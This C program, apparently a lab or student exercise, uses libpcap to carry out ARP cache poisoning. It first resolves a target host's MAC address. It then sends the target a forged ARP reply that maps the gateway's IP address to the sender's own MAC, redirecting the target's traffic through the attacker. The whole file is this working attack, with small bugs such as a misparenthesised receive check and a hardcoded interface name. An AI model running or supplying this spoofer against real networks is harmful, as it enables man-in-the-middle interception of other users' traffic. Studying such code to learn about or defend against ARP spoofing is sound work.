#include "arp_test.h"
int main(int argc, char *argv[])
{
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;
	struct pcap_pkthdr *header;
	struct arp_packet ap;
	struct arp_packet *ap_receive;
	u_char myMacAddress[6];
	u_char myIpAddress[4];
	u_char targetMacAddress[6];
	u_char gatewayIpAddress[4];
	u_char *packet;
	uint32_t packet_send;
	uint32_t packet_receive;
	uint32_t ipAddr_tmp;
	if(argc < 4)
	{
		printf("Please input <network interface> <sender ip> <target ip>\n");
		exit(-1);
	}

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 100, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		exit(-1);
	}
	getMyMacAddress(&myMacAddress); //get My MacAddress
	getIpAddress(&myIpAddress, argv[1]); //get My IPAddress
/** (Who has target ip ?)**/
	for(int i = 0 ; i < 6 ; i ++)
	{
		ap.ether_dhost[i] = 0xFF; // stack packet
		ap.ether_shost[i] = myMacAddress[i];
	}
	ap.ether_type = ntohs(ETHERTYPE_ARP);
	ap.ar_hrd = 0x0100; //Hardware type
	ap.ar_pro = 0x0008; // Protocol type
	ap.ar_hln = 6; // H length
	ap.ar_pln = 4; // P length
	ap.ar_op = 0x0100; //ARPOP_REQUEST
	for(int i = 0 ; i < 6 ; i ++)
	{
		ap.__ar_sha[i] = myMacAddress[i];
		ap.__ar_tha[i] = 0;
	}
	for(int i = 0 ; i < 4 ; i ++)
	{
		ap.__ar_sip[i] = myIpAddress[i];
	}
	
	ipAddr_tmp = ntohl(inet_addr(argv[2]));// parse sender(gateway) ip from argv[2] 
	gatewayIpAddress[0] = (ipAddr_tmp & 0xFF000000) >> 24;
	gatewayIpAddress[1] = (ipAddr_tmp & 0x00FF0000) >> 16;
	gatewayIpAddress[2] = (ipAddr_tmp & 0x0000FF00) >> 8;
	gatewayIpAddress[3] = ipAddr_tmp & 0x000000FF;
	ipAddr_tmp = ntohl(inet_addr(argv[3])); //parse target ip from argv[3]
	ap.__ar_tip[0] = (ipAddr_tmp & 0xFF000000) >> 24;
	ap.__ar_tip[1] = (ipAddr_tmp & 0x00FF0000) >> 16;
	ap.__ar_tip[2] = (ipAddr_tmp & 0x0000FF00) >> 8;
	ap.__ar_tip[3] = ipAddr_tmp & 0x000000FF;
	packet = (u_char*)&ap;
	packet_send = pcap_sendpacket(handle, packet, 42); //send packet
	if(packet_send == -1)
	{
		printf("Failed to send packet.\n");
		exit(-1);
	}

/**** receive target Mac Address ****/
	while(1)
	{
		if(packet_receive = pcap_next_ex(handle, &header, &packet) >= 1) //receive a packet
		{
			ap_receive = (struct arp_packet *)packet;
			if(ntohs(ap_receive->ether_type)!= ETHERTYPE_ARP || ntohs(ap_receive->ar_op) != ARPOP_REPLY)
			{ // filter ARP_REPLY packet
				continue;
			}
			packet += 22; //to get target Mac Address
			for(int i = 0 ; i < 6 ; i ++)
			{
				targetMacAddress[i] = *(packet+i);
			}
			printf("Get target Mac Address.\n");
			break;
		}
		else
		{
			printf("Faile to get target Mac Address.\n");
			exit(-1);
		}
	}

/**** send ARP reply packet ****/
	ap.ar_op = 0x0200; //ARPOP_REPLY
	for(int i = 0 ; i < 6 ; i ++)
	{
		ap.ether_dhost[i] = targetMacAddress[i];
		ap.ether_shost[i] = myMacAddress[i];
		ap.__ar_tha[i] = targetMacAddress[i];
	}
	for(int i = 0 ; i < 4 ; i ++)
	{
		ap.__ar_sha[i] = myMacAddress[i];
		ap.__ar_sip[i] = gatewayIpAddress[i];
	}
	packet = (u_char*)&ap;

	packet_send = pcap_sendpacket(handle, packet, 42); //send packet
	if(packet_send == -1)
	{
		printf("Failed to send packet.\n");
		exit(-1);
	}	
	return 0;
}
void getMyMacAddress(u_char *macAddress) //get MacAddress from my sys file
{
	int temp;
	char temp2;
	char asd[20];
	FILE *f = fopen("/sys/class/net/ens33/address", "r"); //read My mac Address
	for(int i = 0 ; i < 6 ; i ++) // 2 ascii to 1 int  ex) "A3" -> 163
	{	
		temp = 0;
		fscanf(f, "%c", &temp2); 
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48) * 16; // convert from ascii to num(0~9), and mul 16
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87) * 16; // convert from ascii to num(10~15), and mul 16
		}
		fscanf(f, "%c", &temp2);
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48); //convert from ascii to num (0~9)
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87); //convert from ascii to num (10~15)
		}
		if(i != 5)
		{
			fscanf(f, "%c", &temp2); // Skip ":"
		}
		*(macAddress + i) = temp;
	}
}
void getMacAddress(u_char *packet, u_char *macAddress) //get MacAddress from String
{
	int temp;
	char temp2;
	for(int i = 0 ; i < 6 ; i ++)
	{	
		temp = 0;
		temp2 = *(packet++);
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48) * 16; // convert from ascii to num(0~9), and mul 16
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87) * 16; // convert from ascii to num(10~15), and mul 16
		}
		temp2 = *(packet++);
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48); //convert from ascii to num (0~9)
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87); //convert from ascii to num (10~15)
		}
		*(macAddress + i) = temp;
	}
}

void getIpAddress(u_char *ipAddress, u_char *interface) //get IpAddress
{
	uint16_t fd;
	struct ifreq ifr;
	uint32_t ipAddr_tmp;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	ipAddr_tmp = ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr); //get Ip Address
	*ipAddress = (ipAddr_tmp & 0xFF000000) >> 24;
	*(ipAddress+1) = (ipAddr_tmp & 0x00FF0000) >> 16;
	*(ipAddress+2) = (ipAddr_tmp & 0x0000FF00) >>8;
	*(ipAddress+3) = ipAddr_tmp & 0x000000FF;
}
